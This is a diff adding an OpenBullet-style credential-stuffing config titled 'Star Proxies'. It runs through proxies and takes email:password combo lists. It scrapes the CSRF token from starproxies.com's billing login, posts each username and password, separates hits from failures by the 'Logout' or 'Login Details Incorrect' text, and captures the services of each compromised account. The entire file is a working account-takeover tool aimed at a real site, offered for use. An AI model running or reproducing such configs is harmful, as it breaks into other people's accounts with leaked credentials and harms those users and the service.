@@ -1,0 +1,48 @@
+[SETTINGS]
+{
+  "Name": "Star Proxies",
+  "SuggestedBots": 100,
+  "LastModified": "2019-03-14T11:57:45.2945839+01:00",
+  "AdditionalInfo": "",
+  "Author": "Yuri",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "MailPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#Get REQUEST GET "https://starproxies.com/billing/dologin.php" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Origin: https://starproxies.com" 
+  HEADER "Referer: https://starproxies.com/billing/clientarea.php" 
+#Token PARSE "<SOURCE>" LR "name=\"token\" value=\"" "\" />" Recursive=FALSE -> VAR "Token" "" "" 
+#Login REQUEST POST "https://starproxies.com/billing/dologin.php" AutoRedirect=TRUE 
+  CONTENT "token=<Token>&username=<USER>&password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Origin: https://starproxies.com" 
+  HEADER "Referer: https://starproxies.com/billing/clientarea.php" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "Login Details Incorrect. Please try again." 
+  KEYCHAIN Success OR 
+    KEY "Logout" 
+#Services PARSE "<SOURCE>" LR "<p>" " <a href=\"cart.php\">" Recursive=FALSE -> CAP "Services" "" "" 
